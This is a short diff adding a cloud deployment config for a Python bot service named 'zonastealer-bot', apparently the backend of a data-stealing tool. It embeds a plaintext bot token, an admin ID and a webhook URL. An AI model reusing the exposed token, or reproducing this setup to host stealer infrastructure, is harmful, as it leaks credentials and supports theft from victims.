@@ -1,0 +1,16 @@
+services:
+  - type: web
+    name: zonastealer-bot
+    env: python
+    buildCommand: |
+      pip install --upgrade pip
+      pip install -r requirements.txt
+    startCommand: gunicorn bot_main:app
+    envVars:
+      - key: BOT_TOKEN
+        value: 8364189800:AAHHsHHgKZ7oB6XSHExPWn0-0G5Fp8fGNi4
+      - key: ADMIN_ID
+        value: "7725796090"
+      - key: WEBHOOK_URL
+        value: https://zonastealer-bot.onrender.com
+    plan: free
